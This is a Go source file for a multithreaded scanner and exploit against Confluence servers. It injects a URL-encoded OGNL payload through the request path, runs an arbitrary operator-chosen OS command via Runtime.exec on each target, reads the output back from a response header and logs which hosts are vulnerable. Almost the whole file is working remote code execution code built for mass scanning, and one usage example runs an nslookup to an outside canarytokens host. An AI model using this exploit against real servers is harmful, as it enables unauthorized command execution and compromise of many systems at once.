package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"regexp"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

func detectVersion(host string) string {
	req := cookHTTPRequest(fmt.Sprintf("%s/login.action", host))
	resp := fasthttp.AcquireResponse()

	defer func() {
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
	}()

	if err := httpClient.Do(req, resp); err != nil {
		log.Printf("Error making HTTP request to %s: %s", host, err.Error())
	}
	body := resp.Body()
	regexes := []*regexp.Regexp{versRex1, versRex2, versRex3}
	for _, rex := range regexes {
		mver := rex.FindAllSubmatch(body, -1)
		if len(mver) > 0 {
			log.Printf("Target: %s  |  Version found: %s", host, mver[0][1])
			return string(mver[0][1])
		}
	}
	return ""
}

func runExploit(host string, wr *CsvWriter) {
	xver := detectVersion(host)
	payload := `%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22` + cmdExec + `%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Exec-Output%22%2C%23a%29%29%7D`
	req := cookHTTPRequest(fmt.Sprintf("%s/%s/", host, payload))
	resp := fasthttp.AcquireResponse()

	defer func() {
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
	}()

	if err := httpClient.Do(req, resp); err != nil {
		log.Printf("Error making HTTP request to %s: %s", host, err.Error())
	}

	xcmdresp := resp.Header.Peek("Exec-Output")

	// change this if cmd changes according to the cmd val supplied by user
	if len(xcmdresp) > 0 {
		if cmdExec == "id" {
			if baseRex.Match(xcmdresp) {
				log.Println("Target is vulnerable:", host)
				wr.Write([]string{host, "true", xver, string(xcmdresp)})
			}
		} else {
			mrex := regexp.MustCompile(rexMatch)
			if mrex.Match(xcmdresp) {
				log.Println("Target is vulnerable:", host)
				wr.Write([]string{host, "true", xver, string(xcmdresp)})
			}
		}
	} else {
		log.Println("Target doesn't seem vulnerable:", host)
		wr.Write([]string{host, "false", xver})
	}
}

func main() {
	flag.IntVar(&maxConcurrent, "threads", 20, "Number of threads to use while scanning.")
	flag.IntVar(&timeout, "timeout", 5, "HTTP timeout in seconds.")
	flag.StringVar(&userAgent, "user-agent", "Mozilla/5.0 (ConfluentPwn) Chrome/95.0.4638.69 Safari/537.36", "Custom user-agent string to use.")
	flag.StringVar(&urlFile, "file", "", "Specify a file containing list of hosts to scan.")
	flag.StringVar(&cmdExec, "cmd", "id", "Command to execute on a vulnerable confluence server.")
	flag.StringVar(&outFile, "output", "cfpwn-results.csv", "Output filepath to write the scan results into.")
	flag.StringVar(&rexMatch, "regex", "", "Regex to match the response header for the command executed.")

	mainUsage := func() {
		fmt.Fprint(os.Stdout, lackofart, "\n")
		fmt.Fprintf(os.Stdout, "Usage:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stdout, "\nExamples:\n")
		fmt.Fprint(os.Stdout, "  ./cfscan 1.2.3.4:80 1.1.1.1:8080\n")
		fmt.Fprint(os.Stdout, "  ./cfscan -file urls.txt\n")
		fmt.Fprint(os.Stdout, "  ./cfscan -cmd 'nslookup xxxxxxxxxxxxxxxxx.canarytokens.com 1.1.1.1:80'\n")
		fmt.Fprint(os.Stdout, "  ./cfscan -cmd 'ps' -regex '^\\s*PID\\s*TTY\\s*TIME\\s*CMD' http://1.1.1.1:443\n\n")
	}
	flag.Usage = mainUsage
	flag.Parse()

	allTargets = flag.Args()
	if len(allTargets) < 1 && len(urlFile) < 1 {
		flag.Usage()
		log.Println("You need to supply at least a valid target via arguments or '-file' to scan!")
		os.Exit(1)
	}

	fmt.Print(lackofart, "\n\n")
	wr, err := NewCsvWriter(outFile)
	if err != nil {
		log.Fatalln("Cannot write to output file:", err.Error())
	}
	wr.Write([]string{"target", "is_vulnerable", "version", "cmd_output"})

	hosts := make(chan string, maxConcurrent)
	maxProcs := new(sync.WaitGroup)
	maxProcs.Add(maxConcurrent)

	tnow := time.Now()
	log.Println("Starting scan at:", tnow.String())
	for i := 0; i < maxConcurrent; i++ {
		go func() {
			for {
				host := <-hosts
				if host == "" {
					break
				}
				log.Println("Scanning:", host)
				host = checkScheme(host)
				runExploit(host, wr)
			}
			maxProcs.Done()
		}()
	}

	if len(urlFile) > 1 {
		file, err := os.Open(urlFile)
		if err != nil {
			log.Fatalf("Error opening the file: %s. Aborting...", err.Error())
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		for scanner.Scan() {
			hosts <- scanner.Text()
		}

		if err := scanner.Err(); err != nil {
			log.Fatalf("Error opening the file: %s. Aborting...", err.Error())
		}
	}

	for _, item := range allTargets {
		hosts <- item
	}

	close(hosts)
	maxProcs.Wait()
	log.Println("Writing results to output file...")
	wr.Flush()
	tthen := time.Now()
	log.Println("Scan finished at:", tthen.String())
	log.Println("Total time taken:", time.Since(tnow).String())
}
